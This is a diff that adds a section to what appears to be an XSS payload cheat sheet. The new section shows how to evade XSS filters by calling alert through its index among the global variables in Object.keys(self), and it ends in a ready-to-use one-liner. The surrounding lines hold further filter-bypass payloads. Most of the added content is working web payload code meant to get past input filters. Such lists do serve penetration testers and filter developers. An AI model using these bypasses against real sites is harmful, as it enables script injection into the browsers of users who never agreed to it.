@@ -679,6 +679,38 @@ content['alert'](6)
 [12].forEach(alert);
 ```
 
+From [@theMiddle](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/) - Using global variables
+
+The Object.keys() method returns an array of a given object's own property names, in the same order as we get with a normal loop. That's means that we can access any JavaScript function by using its **index number instead the function name**.
+
+```javascript
+c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
+// 5
+```
+
+Then calling alert is :
+
+```javascript
+Object.keys(self)[5]
+// "alert"
+self[Object.keys(self)[5]]("1") // alert("1")
+```
+
+We can find "alert" with a regular expression like ^a[rel]+t$ : 
+
+```javascript
+a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //bind function alert on new function a()
+
+// then you can use a() with Object.keys
+
+self[Object.keys(self)[a()]]("1") // alert("1")
+```
+
+Oneliner: 
+```javascript
+a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
+```
+
 From [@quanyang](https://twitter.com/quanyang/status/1078536601184030721) tweet.
 
 ```javascript
